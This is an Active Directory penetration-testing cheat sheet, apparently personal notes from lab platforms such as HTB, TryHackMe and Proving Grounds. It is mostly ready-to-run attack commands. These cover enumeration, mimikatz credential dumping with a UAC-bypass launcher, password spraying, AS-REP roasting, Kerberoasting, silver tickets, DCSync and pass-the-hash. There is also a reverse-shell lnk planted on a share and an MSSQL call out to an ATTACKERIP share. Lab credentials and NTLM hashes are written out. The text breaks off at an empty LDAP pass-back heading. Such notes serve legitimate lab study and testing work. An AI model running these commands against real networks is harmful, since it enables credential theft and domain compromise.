- Not all the usernames found are always the ones that work. For example: you might find autologon creds `svc_loanmanager:Moneymakestheworldgoround!` which however lead to login with `evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'`
- Every time that you think about Active Directory, think about a Forest, not a Domain. If one domain is compromised, so it is the entire forest. Whithin a forest, all the domains trust each others. This is why a forest is considered a security boundry.
- Making changes to the local administrator group is one of the noisiest thing you can do


#### <ins>Initial foothold</ins>
- run `responder` + `mitm6`
- `enum4linux -a -u "" -p "" 192.168.180.30`
- `nmap -Pn -T4 -p- --min-rate=1000 -sV -vvv 10.10.108.190 -oN nmap_results`
- `nmap -p- -A -nP 192.168.212.165 -oN nmap_results`
- `dig @192.168.212.165 AXFR heist.offsec`
- `dnsenum 192.168.174.187`
- After this
  - [ ] 53, zone transfer + info collection
  - [ ] 139/445 Check SMB / smbclient
    - check upload of web shells / phishing
    - check eternal blue
    - check default creds
  - [ ] 389 Check ldapsearch
    - use windapsearch.py
    - try LDAP Pass-back attack
  - [ ] Check rpcclient
  - [ ] Check all services in scope, like web vulnerabilities, ftp etc.
  - [ ] Enumerate any AS-REP / Kerberos roastable users
  - [ ] Check ZeroLogon
  - [ ] Check every section of this file
  - [ ] Check default creds
    - also in Printers, Jenkins etc.
  - [ ] Check: 
    - https://infosecwriteups.com/active-directory-penetration-testing-cheatsheet-5f45aa5b44ff
    - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
    - https://wadcoms.github.io/ <# interactive cheat-sheet #>
    - https://github.com/seeu-inspace/easyg
  - [ ] 464 kpasswd -> try Kerberoast
  - [ ] Test NFS -> port 111, 2049 (see even if nmap doesn't mark it as NFS)
  - [ ] If you don't find something here, see exploitaiton-notes
  - [ ] Check kerberoasting
    - Not only kerbrute etc., try also to retrieve TGS ticket
    - Test AS-REP roasting and Kerberoasting
    - AS-REP, Kerberost, Rubeus (con e senza creds)
  - [ ] If you find creds / hashes, try:
    - crackmapexec to see a reuse of creds
    - evil-winrm
    - kerberoasting impacket-GetUserSPNs
      - AS-REP, Kerberost, Rubeus
    - enum4linux (once without auth and only once with creds)
      - see descriptions
    - smbclient
    - ldap
- PrivEsc / Post Access
  - [ ] enumerate with bloodhound, powershell, powerview
  - [ ] Check privileges
    - whoami /priv, Get-ADUser -identity s.smith -properties *
  - [ ] try access with rdp
  - [ ] mimikatz.exe
  - [ ] test creds already found
    - crackmapexec, ldap with auth, enum4linux (see descriptions), smbclient
    - kerberoast (AS-REP, Kerberost, Rubeus, etc. -> retrieve TGS)
    - secrets dump, impacket-psexec, impacket-wmiexec, evil-winrm
    - test also hashes
  - [ ] Azure
  - [ ] Play with Rubeus
  - [ ] See DCSync (try with various tools, come aclpwn)
  - [ ] See all sections of this document
  - [ ] See powershell history
  - [ ] Run Seatbelt first, then winPEAS


#### <ins>Manual Enumeration</ins>

#### Legacy Windows applications

```
net user /domain                       display users in the domain
net user <username> /domain            net-user against a specific user
net group /domain                      enumerate groups in the domain
net group "<group-name>" /domain       display members in specific group
```

#### PowerShell and .NET

```
LDAP://host[:port][/DistinguishedName]                                      LDAP path format. CN = Common Name; DC = Domain Component;
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()       domain class from System.DirectoryServices.ActiveDirectory namespace
powershell -ep bypass                                                       bypass the execution policy
([adsi]'').distinguishedName                                                obtain the DN for the domain
```

#### PowerView

```
Misc
----
Import-Module .\PowerView.ps1                                                                                                             Import PowerView; https://powersploit.readthedocs.io/en/latest/Recon/
Get-NetDomain                                                                                                                             Obtain domain information
Get-NetUser | select cn,pwdlastset,lastlogon                                                                                              Obtain users in the domain; username only
Get-NetGroup | select cn                                                                                                                  Obtain groups in the domain
Get-NetGroup "GROUP-NAME" | select member                                                                                                 Enumerate a specific group
Get-NetComputer                                                                                                                           Enumerate the computer objects in the domain
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion                                                               Display OS and hostname
Find-LocalAdminAccess                                                                                                                     Scan domain to find local administrative privileges for our user
Get-NetSession -ComputerName INPUT -Verbose                                                                                               Check logged on users with Get-NetSession
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl                                                   Display permissions on the DefaultSecurity registry hive
Get-NetUser -SPN                                                                                                                          Kerberoastable users
Get-ADGroupMember 'Web Admins'                                                                                                            Get details about a group, in this case, 'Web Admins'
Get-NetUser | select Description                                                                                                          Enumerate the domain users descriptions
Get-NetGroup -GroupName *admin*                                                                                                           Enumerate the domain groups
Get-NetComputer -fulldata | select operatingsystem                                                                                        Find all operating systems running
Get-DomainPolicyData                                                                                                                      Retrieve domain policy for the current domain
(Get-DomainPolicyData).systemaccess                                                                                                       Retrieve domain policy for the current domain
(Get-DomainPolicyData -domain moneycorp.local).systemaccess                                                                               Retrieve domain policy for another domain
Get-DomainController                                                                                                                      Retrieve domain controllers for the current domain
Get-DomainController -Domain moneycorp.local                                                                                              Retrieve domain controllers for another domain
Get-DomainGroup *admin*                                                                                                                   Retrieve all groups containing the word "admin" in group name
Get-DomainGroupMember -Identity "Domain Admins" -Recurse                                                                                  Retrieve all the members of the Domain Admins group
Get-DomainGroup -UserName "user1"                                                                                                         Retrieve the group membership for a user
Get-NetLocalGroup -ComputerName dcorp-dc                                                                                                  List all the local groups on a machine (administrator privs on non-dc machines needed)
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators                                                                  Retrieve members of the local group "Administrators" on a machine (administrator privs on non-dc machines needed)
Get-NetLoggedon -ComputerName dcorp-adminsrv                                                                                              Retrieve actively logged users on a computer (local admin rights on the target needed)
Get-LoggedonLocal -ComputerName dcorp-adminsrv                                                                                            Retrieve locally logged users on a computer (remote registry on the target - started by-default on server OS needed)
Get-LastLoggedOn -ComputerName dcorp-adminsrv                                                                                             Retrieve the last logged user on a computer (administrative rights and remote registry on the target needed)
Invoke-FileFinder -Verbose                                                                                                                Find sensitive files on computers in the domain
Get-NetFileServer                                                                                                                         Get all fileservers of the domain
Get-DomainGPOLocalGroup                                                                                                                   Retrieve GPO(s) which use Restricted Groups or groups.xml for interesting users
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-user1                                                                      Retrieve users which are in a local group of a machine using GPO
Get-DomainGPOUserLocalGroupMapping -Identity user1 -Verbose                                                                               Retrieve machines where the given user is member of a specific group
Get-DomainOU                                                                                                                              Retrieve OUs in a domain
Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}"                                                                          Retrieve GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
Find-LocalAdminAccess -Verbose                                                                                                            Find all machines on the current domain where the current user has local admin access
Find-DomainUserLocation -CheckAccess                                                                                                      Find computers where a domain admin session is available and current user has admin access
Find-DomainUserLocation -Stealth                                                                                                          Find computers where a domain admin session is available


Get details, in this case, about user svc__apache
-------------------------------------------------
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description                                                                Check for non-empty descriptions of domain users


Object Permissions Enumeration
------------------------------
Get-ObjectAcl -Identity <username>                                                                                                        Enumerate ACEs
Convert-SidToName <SID>                                                                                                                   Convert ObjectISD and SecurityIdentifier into names
"<SID>", "<SID>", "<SID>", "<SID>", ... | Convert-SidToName                                                                               Convert <SID>s into names
Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerat ACLs for <group>, only display values equal to GenericAll


Domain Shares Enumeration
-------------------------
Find-DomainShare
Invoke-ShareFinder -verbose


Get a list of users in the current domain
-----------------------------------------
Get-DomainUser
Get-DomainUser -Identity user1


Get list of all properties for users in the current domain
----------------------------------------------------------
Get-DomainUser -Identity user1 -Properties *
Get-DomainUser -Properties samaccountname,logonCount


Get a list of computers in the current domain
----------------------------------------------
Get-DomainComputer | select Name
Get-DomainComputer -OperatingSystem "*Server 2022*"
Get-DomainComputer -Ping


Get all the groups in the current domain
----------------------------------------
Get-DomainGroup | select Name
Get-DomainGroup -Domain <targetdomain>


Get list of GPO in current domain
---------------------------------
Get-DomainGPO
Get-DomainGPO -ComputerIdentity dcorp-user1


ACL Enumeration
---------------
Get-DomainObjectAcl -SamAccountName user1 -ResolveGUIDs                                                                                                    Retrieve the ACLs associated with the specified object
Get-DomainObjectAcl -SearchBase "LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose                               Retrieve the ACLs associated with the specified prefix to be used for search
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access                                                                       Enumerate ACLs using ActiveDirectory module but without resolving GUIDs
Find-InterestingDomainAcl -ResolveGUIDs                                                                                                                    Search for interesting ACEs
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"                                                                                           Retrieve the ACLs associated with the specified path


Get a list of all domain trusts for the current domain
------------------------------------------------------
Get-DomainTrust
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local


Forest mapping
--------------
Get-Forest                                   Retrieve details about the current forest, specify a Forest with -Forest domain.local
Get-ForestDomain                             Retrieve all domains in the current forest, specify a Forest with -Forest domain.local
Get-ForestGlobalCatalog                      Retrieve all global catalogs for the current forest, specify a Forest with -Forest domain.local
Get-ForestTrust                              Map trusts of a forest, specify a Forest with -Forest domain.local


Find computers where a domain admin, a specified user or group has sessions
---------------------------------------------------------------------------
Find-DomainUserLocation -Verbose
Find-DomainUserLocation -UserGroupIdentity "RDPUsers"

```
- See also [PowerView-3.0-tricks.ps1](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993), [HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview) and [HarmJ0y](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

#### [ADModule](https://github.com/samratashok/ADModule)

```
Import it
---------
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1


Misc
----
Get-ADDomainController                                                                                 Retrieve domain controllers for the current domain
Get-ADDomainController -DomainName moneycorp.local -Discover                                           Retrieve domain controllers for another domain
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description     Check for non-empty descriptions of domain users
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name                                               Retrieve all groups containing the word "admin" in group name
Get-ADGroupMember -Identity "Domain Admins" -Recursive                                                 Retrieve all the members of the Domain Admins group
Get-ADPrincipalGroupMembership -Identity user1                                                         Retrieve the group membership for a user


Get a list of users in the current domain
-----------------------------------------
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *


Get list of all properties for users in the current domain
----------------------------------------------------------
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}


Get a list of computers in the current domain
----------------------------------------------
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}


Get all the groups in the current domain
----------------------------------------
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties *


Get a list of all domain trusts for the current domain
------------------------------------------------------
Get-ADTrust
Get-ADTrust -Identity us.dollarcorp.moneycorp.local


Forest mapping
--------------
Get-ADForest                                                            Retrieve details about the current forest, specify a Forest with -Identity eurocorp.local
(Get-ADForest).Domains                                                  Retrieve all domains in the current forest
Get-ADForest | select -ExpandProperty GlobalCatalogs                    Retrieve all global catalogs for the current forest
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'             Map trusts of a forest

```

#### [Invoke-SessionHunter](https://github.com/Leo4j/Invoke-SessionHunter)
```
Invoke-SessionHunter -FailSafe
Invoke-SessionHunter -NoPortScan -Targets C:\Documents\servers.txt
```


#### From a compromised machine
MMC
  1. Search Bar > Type `mmc` and press enter
  2. See the steps for this app in https://tryhackme.com/room/adenumeration Task 3
Command Prompt
  - `net user /domain`
  - `net user zoe.marshall /domain`
  - `net group /domain`
  - `net group "Tier 1 Admins" /domain`
  - `net accounts /domain`
PowerShell
  - `Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *`
  - `Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A`
  - `Get-ADGroup -Identity Administrators -Server za.tryhackme.com -Properties *`
  - `Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com`
  - `Get-ADGroupMember -Identity "Tier 2 Admins" | Select-Object Name, SamAccountName, DistinguishedName`
  - `$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)`
  - `Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com`
  - `Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com`
  - `Get-ADDomain -Server za.tryhackme.com`
  - `Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
BloodHound`

#### More enumeration

**AD User**
- `Get-ADUser -identity s.smith -properties *`
- If part of Audit Share, see the share `NETLOGON`
- Check the value in `ScriptPath`, they should be available in `NETLOGON`

**Kerberos user enumeration**
- `/home/kali/Documents/windows-attack/active_directory/kerbrute/kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.159.49 usernames.txt`

**Server Manager**
- See event logs with: Event Viewer
- Navigate to the tools tab and select the Active Directory Users and Computers

**Misc**
Always enumerate first, do not grab the low hanging fruit first, since it might be a decoy. Also check logon count and login policy.
- An example: run `Get-DomainUser | select samaccountname, logonCount`, if you see an account that seems like a low hanging fruit but has zero logons, it might be a decoy or a dorment user.
- Check: `logonCount`, `lastlogontimestamp`, `badpasswordtime`, `Description`
- Take also in consideration your target organization: is this their first assesment? Do they invest in their security (time, effort)?


#### <ins>SMB</ins>
enumeration
- `enum4linux -a -u "" -p "" 192.168.180.21`
- `enum4linux -a -u "Guest" -p "" 192.168.180.21`
- `sudo nmap -vvv -p 137 -sU --script=nbstat.nse 192.168.249.55`
- `nmap -vvv -p 139,445 --script=smb* 192.168.180.21`
- `crackmapexec smb 192.168.180.21 -u 'guest' -p ''`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --shares`
  - see anon logins
  - use flags `--shares` and `--rid-brute`
- `crackmapexec smb 192.168.174.175 -u 'guest' -p ''`
  - see anon logins
  - use flags `--shares` and `--rid-brute` (`SidTypeUser` are users)
- `smbmap -H 192.168.249.55`
- `smbclient \\\\\192.168.249.55\\`
- `smbclient -U '' -L \\\\\192.168.220.240\\`
- `smbclient --no-pass -L //192.168.174.175`
- `smbclient -L //192.168.174.175 -N`
- `impacket-lookupsid vulnnet-rst.local/guest@10.10.146.39 > usernames.txt`
- `cat usernames.txt | grep -i user | awk -F \\'{print $$2}' | awk '{print $1}'`	

connect to share
- `smbclient //192.168.207.116/IPC$`
- `smbclient \\\\\192.168.212.172\\Shenzi`
- `smbclient //192.168.203.172/DocumentsShare -U CRAFT2/thecybergeek`
- If you find a suspicious share, try to upload a lnk file
  - create a shortcut with the command for a reverse shell with `powercat.ps1`
  - `cp link.lnk \\192.168.212.172\DocumentsShare`

mount a share
- `mount -t cifs "//10.10.10.103/Department Shares" /mnt`
  `mount -t cifs -o username=amanda,password=Ashare1972 "//10.10.10.103/CertEnroll" /mnt`
  - from the mounted share, see write perms:
    `find . -type d | while read directory; do touch ${directory}/0xdf 2>/dev/null && echo "${directory} - write file" && rm ${directory}/0xdf; mkdir ${directory}/0xdf 2>/dev/null && echo "${directory} - write directory" && rmdir ${directory}/0xdf; done`
  - see deleted files:
    `touch {/mnt/ZZ_ARCHIVE/,./}0xdf.{lnk,exe,dll,ini}`

exploitation
- check if this smb hosts files of the web service, it might be possible to upload a shell
- maybe it's possible to do phishing
- `nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 192.168.174.187`
  - CVE-2017-0143 EternalBlue
  
change password
- If you find 'STATUS_PASSWORD_MUST_CHANGE': `smbpasswd -r $IP -U sbradley`
- Alternativa: `impacket-smbpasswd -newpass testing1234 sbradley:roastpotatoes@10.10.95.8`


#### <ins>RPC</ins>
- `rpcclient 192.168.180.20 -N`
- `rpcclient 192.168.174.187 -U nik`
- `rpcclient -U "" -N 10.10.10.172`
- Commands: `enumdomusers`, `enumdomgroups`, `querydispinfo`
  - `cat rpc_dump | awk '{print $1}' | cut -f2 -d [ | cut -f1 -d ] > ad_users.txt`
  - After `enumdomusers`, notes the `rid` values, then
    `queryuser RID-HERE`, example `queryuser 0x1f4`
- `impacket-rpcdump @192.168.180.21`
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
- Reset password: (see for `svc_helpdesk` accounts)
  `setuserinfo2 username 23 password`



#### <ins>Azure</ins>
- https://blog.xpnsec.com/azuread-connect-for-redteam/
- https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html


#### <ins>LDAP</ins>

- `ldapsearch -v -x -b "DC=resourced,DC=local" -H "ldap://192.168.174.187" "(objectclass=*)"`
  - check descriptions (you might find passwords in descriptions), enumerate users
- `ldapsearch -v -c -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.212.175 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
  - to find Administrator password
  - using creds `fmcsorley:CrabSharkJellyfish192` for domain `HUTCH.OFFSEC`
- `ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o ~/Downloads/ldap/`

Domain Enumeration
1. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172`
2. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172 -U --admin-objects`
   - Use the flag `--full` to get full results
3. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt`
- You can also see wich elements belongs in a group
  - `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172 -U -m "Remote Management Users"`
- Find possible passwords
  - `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.182 -U --full | grep 'Pwd'`

#### <ins>PsLoggedOn</ins>

Download: [PsLoggedOn - Sysinternals | Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon)
```
.\PsLoggedon.exe \\COMPUTERNAME       See user logons at COMPUTERNAME
```

#### <ins>Service Principal Names Enumeration</ins>

```
setspn -L <username>                                                List the SPNs connected to a certain user account
Get-NetUser -SPN | select samaccountname,serviceprincipalname       List the SPNs accounts in the domain
```

#### <ins>Object Permissions Enumeration</ins>=
```
Get-ObjectAcl -Identity <username>                                                                                                        Enumerate ACEs
Convert-SidToName <SID>                                                                                                                   Convert ObjectISD and SecurityIdentifier into names
"<SID>", "<SID>", "<SID>", "<SID>", ... | Convert-SidToName                                                                               Convert <SID>s into names
Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerat ACLs for <group>, only display values equal to GenericAll
```

#### <ins>Domain Shares Enumeration</ins>

```
Find-DomainShare       Find Domain Shares
```

#### <ins>SharpHound</ins>

```
Import-Module .\Sharphound.ps1                                                                  Import SharpHound; https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
Get-Help Invoke-BloodHound                                                                      Learn more about Invoke-BloodHound; To run SharpHound you must first start BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory <DIR> -OutputPrefix "corp audit"       Collect domain data
Invoke-Bloodhound -CollectionMethod All -Domain domain.local -ZipFileName file.zip
```

Alternatives
- `python3 /home/kali/Documents/windows-attack/Scripts/BloodHound.py/bloodhound.py -d heist.offsec -u enox -p california -c all -ns 192.168.212.165`
- `.\SharpHound.exe -c All -d CONTROLLER.local --zipfilename loot.zip`
- `SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs`

#### <ins>BloodHound</ins>

- Note: you need to start Neo4j first with `sudo neo4j start` and then use the command `bloodhound` to start BloodHound.
- Default credentials for Neo4j: `neo4j:neo4j`
- Log in BloodHound with Neo4j's credentials
- Upload here the zip created with SharpHound
- Pre-built queries
  - Find Workstations where Domain Users can RDP
  - Find Servers where Domain Users can RDP
  - Find Computers where Domain Users are Local Admin
  - Shortest Path to Domain Admins from Owned Principals
- Custom queries
  - `MATCH (m:Computer) RETURN m`  to display all computers
  - `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p` to display all active sessions
- Try every query
  - See the groups of the user pwned, query 'Shortest Path to High Value targets'
  - Active Directory security groups: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators
  - Search for the users / machines owned and mark them as it. Then use the query 'Reachable High Value Targets'


#### <ins>Mimikatz</ins>

After starting `mimikatz.exe`, run the command `privilege::debug` to enable `SeDebugPrivilege` and run `token::elevate`
```
sekurlsa::logonpasswords                                                           Dump the credentials of all logged-on users
sekurlsa::tickets                                                                  Tickets stored in memory
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell       Overpass the Hash
sekurlsa::msv                                                                      Extracting NTLM hashes from LSASS memory
crypto::capi                                                                       Make non-exportable keys exportable; CryptoAPI function
crypto::cng                                                                        Make non-exportable keys exportable; KeyIso service
lsadump::dcsync /user:<domain>\<user>                                              Domain Controller Synchronization
lsadump::lsa /patch                                                                Dump the hashes
```

Other commands to run
- `log`
- `lsadump::sam`
- `lsadump::secrets`
- `lsadump::cache`
- `lsadump::ekeys`

Notes
- If `privilege::debug` doesn't work, try with:
  - `. .\Invoke-PsUACme.ps1`
  - `Invoke-PsUACme -method oobe -Payload "powershell -ExecutionPolicy Bypass -noexit -file C:\temp\mimikatz.exe"`
- You can: steal credentials, generate Kerberos tickets, dump credentials stored in memory and leverage attacks
- A few attacks: Credential dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket
- See https://github.com/gentilkiwi/mimikatz/wiki
- The first thing to do is always to run `privilege::debug`
- See: https://github.com/drak3hft7/Cheat-Sheet---Active-Directory
- With mimikatz you can turn on the feature widgets. It enables you to see then password in plain text for users that logon and log off
- See also `Invoke-Mimikatz`
- Use `/patch` with a command, it might work
   - esempio: `lsadump::sam /patch`
- https://adsecurity.org/?page_id=1821
- You can also run commands like this: `.\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit`, especially if you see the prompt going nuts


#### <ins>Active Directory Authentication Attacks</ins>

#### Password Attacks

With LDAP and ADSI
- Before any attack, check `net accounts` to learn more about account lockouts
- Use the script [Spray-Passwords.ps1](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)
  - Search wich user has the password `SecretPass123!` with `.\Spray-Passwords.ps1 -Pass SecretPass123! -Admin`
  - Remember to run `powershell -ep bypass` before using scripts

Leveraging SMB
- `crackmapexec smb <IP> -u users.txt -p 'SecretPass123!' -d <domain-name> --continue-on-success` Password spraying
- `crackmapexec smb <domain_name>/<username>:'abd132' -M targets.txt` Spray a specified password `abd132` against all domain joined machines contained in `targets.txt`
- Note: this doesn't take in consideration the password policy of the domain

By obtaining a TGT
- It's possible to use kinit to obtain and cache a Kerberos TGT and automate the process with a script
- It's also possible to use [kerbrute](https://github.com/ropnop/kerbrute) instead
  - `.\kerbrute_windows_amd64.exe passwordspray -d <domain-name> .\usernames.txt "SecretPass123!"`

#### AS-REP Roasting

On Linux
1. `impacket-GetNPUsers -dc-ip <IP-Domain-Controller> -request -outputfile <outuput_file.asreproast> <domain>/<user>` perform AS-REP roasting
2. crack the AS-REP hash
   - `sudo hashcat -m 18200 outuput_file.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` 
   - `john --wordlist=/usr/share/wordlists/rockyou.txt kerberos-users-found`

On Windows
1. With [Rubeus](https://github.com/GhostPack/Rubeus), `.\Rubeus.exe asreproast /nowrap` perform AS-REP roasting
2. crack the AS-REP hash
   - `sudo hashcat -m 18200 outuput_file.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` 
   - `john --wordlist=/usr/share/wordlists/rockyou.txt kerberos-users-found`

Alternatives
- From the already hacked machine
  - https://github.com/HarmJ0y/ASREPRoast
  - `. .\ASREPRoast.ps1`
  - `Get-ASREPHash -Domain megacorp.local -Username jorden`
- `UF_DONT_REQUIRE_PREAUTH`
  - https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#get-as-rep-hash


#### Kerberoasting

- see: https://github.com/drak3hft7/Cheat-Sheet---Active-Directory#kerberoast
- Note: if you have a service account (like `svc_apache`) it's possible to kerberoast
  - see powerview command `Get-netuser username`

Retrieve TGS
  - `impacket-GetNPUsers -dc-ip 10.10.153.149 THM.red/thm:'Passw0rd!'`
  - `impacket-GetNPUsers vulnnet-rst.local/t-skid:tj072889 -dc-ip 10.10.146.39 -request`
  Alternatives
  - From a compromised machine: `.\Rubeus.exe kerberoast`, `.\Rubeus.exe kerberoast /nowrap` or `.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972`
  - `impacket-GetUserSPNs lab.enterprise.thm/nik:ToastyBoi! -request`
    - you need to add the domain and IP to /etc/hosts to make this command work

Crack the hash
- `hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -O`
- `hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
- Note: you can run commands as another user with `runas` or `Invoke-RunasCs.ps1`
  - `Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/shell.exe'`

#### Silver Tickets

To create a silver ticket, you need:
- SPN password hash
- Domain SID
- Target SPN

1. With mimikatz, run the commands `privilege::debug` and `sekurlsa::logonpasswords` to extract cached AD credentials. Note the NTLM hash of the target user
2. Run on the PowerShell the command `whoami /user` to obtain the domain SID (omit the last 4 digits). Note: you should be able to find it also in the previous step
3. Target an SPN
4. Run `kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:<TARGET> /service:<SERVICE> /rc4:<NTLM-HASH> /user:<USER>`
5. Confirm that you have the ticket ready to use in memory with `klist`

**Another way to do it**
1. `impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator`
2. `export KRB5CCNAME=$PWD/Administrator.ccache`
3. `klist`
4. `sudo nano /etc/krb5user.conf`
5. `sudo echo '127.0.0.1       localhost nagoya.nagoya-industries.com NAGOYA-INDUSTRIES.COM' >> /etc/hosts`
6. `impacket-mssqlclient -k nagoya.nagoya-industries.com`
   - `select system_user;`
   - `SELECT * FROM OPENROWSET (BULK 'c:\users\administrator\desktop\proof.txt', SINGLE_CLOB) as correlation_name;`

- Requirement: running in the context of service user (example `svc_mssql`)
- MSSQL, verify if it's running in the context of service user
  1. from kali: `impacket-smbserver -smb2support share /home/kali/Downloads/`
  2. from mssql: `exec xp_dirtree '\\ATTACKERIP\share'`
  3. from `impacket-smbserver`, see the user that tried to authenticate
  - See 'Nagoya' from PG as an example
- If you have a password, you can generate an NTHASH: https://codebeautify.org/ntlm-hash-generator?utm_content=cmp-true
  - There are many tools for this purpose

#### Domain Controller Synchronization (DCSync)

With Bloodhound, use the query 'Find Principals with DCSync Rights'
- Another way to see wich user can DCSync is to see who possesses 'Replication Righs' with `PowerView.ps1`
  - `Get-ObjectACL "DC=htb,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get') }`

On Linux
1. `impacket-secretsdump -just-dc-user <target-user> <domain>/<user>:"<password>"@<IP>`
2. Crack the NTLM hash with `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

On Windows
1. In mimikatz, run the command `lsadump::dcsync /user:<domain>\<user>`, note the Hash NTLM
2. Crack the NTLM hash with `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

Another way
- with [aclpwn.py](https://github.com/fox-it/aclpwn.py), `python aclpwn.py -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161 -du neo4j -dp neo4j`

Connect with NTLM
- `evil-winrm -u Administrator -H '823452073d75b9d1cf70ebdf86c7f98e' -i 10.10.10.175 -N`
- `impacket-psexec egotistical-bank.local/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e`


#### LDAP Pass-back attack

